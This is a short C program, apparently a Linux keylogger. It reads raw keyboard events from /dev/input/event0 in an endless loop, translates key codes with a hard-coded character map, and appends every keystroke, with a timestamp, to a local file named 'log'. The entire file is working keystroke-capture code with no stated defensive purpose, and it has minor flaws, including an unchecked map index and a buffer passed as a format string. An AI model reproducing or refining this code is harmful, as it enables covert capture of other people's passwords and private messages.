#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<sys/time.h>
#include<time.h>
#include<string.h>
#include<linux/input.h>
#include<sys/stat.h>
#include<fcntl.h>

int main(int argc,char* argv[]) {

	printf("***Creating log file***\n");

	FILE* fp;
	fp = fopen("log","a");
	char buffer[1024];

	// Get time
	struct timeval tv;
	time_t t;
	struct tm *info;

	gettimeofday(&tv,NULL);
	t = tv.tv_sec;
	info = localtime(&t);
	strftime(buffer,sizeof(buffer), "%A %B %d %I:%M %P\n",info);

	// Write start for signify beggining of log
	// Write current time of day

	fprintf(fp,"start\t",sizeof("start"));
	fprintf(fp,buffer,sizeof(buffer));
	int c = 0;

	memset(buffer,0,sizeof(buffer));

	struct input_event ev;
	int eventFile = open("/dev/input/event0", O_RDONLY);
	char *map = "..1234567890-=..qwertyuiop{}..asdfghjkl;'...zxcvbnm,.-....";
	int j = 0;

	while(1){
		read(eventFile,&ev,sizeof(ev));
		if ((ev.type == EV_KEY) && (ev.value == 0))
		{
			//printf("%c\n",map[ev.code]);
			fflush(fp);
			switch(ev.code)
			{
			case 57:
				fprintf(fp," ");
				break;
			case 28:
				fprintf(fp,"\n");
				break;
			default:
				fprintf(fp,"%c",map[ev.code]);
			}
		}
	}
	fclose(fp);
	printf("\nFinished\n");
}
